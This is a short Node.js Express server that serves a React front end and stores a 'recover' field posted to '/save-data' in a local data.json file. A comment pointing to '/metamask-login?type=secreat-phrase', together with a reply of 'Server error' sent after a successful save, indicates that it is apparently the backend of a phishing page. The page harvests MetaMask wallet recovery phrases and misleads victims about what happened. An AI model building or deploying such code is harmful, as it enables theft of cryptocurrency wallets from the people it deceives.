const express = require("express");
const fs = require("fs");
const path = require("path");
const app = express();
const cors = require('cors');
const PORT = 80;

app.use(cors())
// http://localhost:80/metamask-login?type=secreat-phrase

// Middleware to parse JSON bodies
app.use(express.json());

// Endpoint to save data
app.post("/save-data", (req, res) => {
  const newData = req.body; // Get the data from the request body

  // Read the existing data from data.json
  const filePath = path.join(__dirname, "data.json");
  fs.readFile(filePath, "utf8", (err, data) => {
    if (err) {
      return res.status(500).send("Error reading file");
    }

    const jsonData = JSON.parse(data);
    if (!jsonData.find((item) => item.recover === newData.recover)) {
      jsonData.push({recover: newData.recover}); // Add the new data to the array
    }
    // Write the updated data back to data.json
    fs.writeFile(filePath, JSON.stringify(jsonData, null, 2), (err) => {
      if (err) {
        console.error("Error writing file:", err);
        return res.status(500).send("Error writing file");
      }
      res.status(200).send("Server error");
    });
  });
});

// Serve the React app
app.use(express.static(path.join(__dirname, "dist")));

// Handle React routing
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "dist", "index.html"));
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
